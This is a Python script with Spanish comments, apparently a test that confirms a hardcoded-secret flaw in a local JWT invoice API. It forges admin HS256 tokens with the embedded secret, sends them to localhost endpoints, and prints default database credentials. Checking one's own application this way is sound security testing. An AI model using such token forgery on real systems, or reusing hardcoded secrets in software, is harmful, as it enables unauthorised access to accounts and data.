#!/usr/bin/env python3
"""
Script para probar vulnerabilidad de credenciales embebidas
Uso: python3 test_hardcoded_credentials.py
"""

import jwt
import requests
import json
import sys

# Configuración
BASE_URL = "http://localhost:5000"
HARDCODED_SECRET = "secreto_super_seguro"

def test_jwt_secret():
    """Probar si el secreto JWT hardcodeado funciona"""
    print("🔍 Probando secreto JWT hardcodeado...")
    
    try:
        # Generar token falso con el secreto hardcodeado
        fake_payload = {
            "id": "999",
            "admin": True,
            "role": "admin",
            "iat": 1234567890,
            "exp": 9999999999
        }
        
        fake_token = jwt.encode(fake_payload, HARDCODED_SECRET, algorithm="HS256")
        print(f"✅ Token falso generado: {fake_token[:50]}...")
        
        # Probar si el token es válido
        url = f"{BASE_URL}/auth/"
        headers = {"Authorization": f"Bearer {fake_token}"}
        
        response = requests.get(url, headers=headers)
        print(f"Status con token falso: {response.status_code}")
        
        if response.status_code == 200:
            print("🚨 VULNERABILIDAD CONFIRMADA: Token falso es válido")
            return True
        else:
            print("❌ Token falso no es válido")
            return False
            
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def test_database_credentials():
    """Probar credenciales de base de datos por defecto"""
    print("\n🔍 Probando credenciales de base de datos...")
    
    # Estas son las credenciales por defecto del knexfile.ts
    default_creds = {
        "host": "localhost",
        "user": "user",
        "password": "password",
        "database": "jwt_api",
        "port": 5432
    }
    
    print("Credenciales por defecto encontradas:")
    for key, value in default_creds.items():
        print(f"  {key}: {value}")
    
    print("\n⚠️  Estas credenciales están hardcodeadas en el código")
    print("   Un atacante podría usarlas para acceder a la base de datos")

def test_login_with_fake_token():
    """Intentar hacer login con token falso"""
    print("\n🔍 Probando acceso con token falso...")
    
    try:
        # Generar token falso
        fake_payload = {"id": "1", "iat": 1234567890, "exp": 9999999999}
        fake_token = jwt.encode(fake_payload, HARDCODED_SECRET, algorithm="HS256")
        
        # Intentar acceder a endpoint protegido
        url = f"{BASE_URL}/invoices"
        headers = {"Authorization": f"Bearer {fake_token}"}
        
        response = requests.get(url, headers=headers)
        print(f"Status en /invoices: {response.status_code}")
        
        if response.status_code == 200:
            print("🚨 VULNERABILIDAD CONFIRMADA: Acceso no autorizado exitoso")
            print(f"Datos obtenidos: {response.text[:200]}...")
        else:
            print(f"❌ Acceso denegado: {response.text}")
            
    except Exception as e:
        print(f"❌ Error: {e}")

def main():
    print("🔍 Probando vulnerabilidades de credenciales embebidas...")
    
    # Probar secreto JWT
    jwt_vulnerable = test_jwt_secret()
    
    # Probar credenciales de base de datos
    test_database_credentials()
    
    # Probar acceso con token falso
    test_login_with_fake_token()
    
    print("\n🎯 Resumen:")
    if jwt_vulnerable:
        print("✅ Vulnerabilidad de JWT confirmada")
    else:
        print("❌ Vulnerabilidad de JWT no confirmada")
    
    print("⚠️  Credenciales de base de datos por defecto encontradas")
    print("📋 Revisar archivos:")
    print("   - services/backend/src/utils/jwt.ts")
    print("   - services/backend/src/knexfile.ts")

if __name__ == "__main__":
    main()
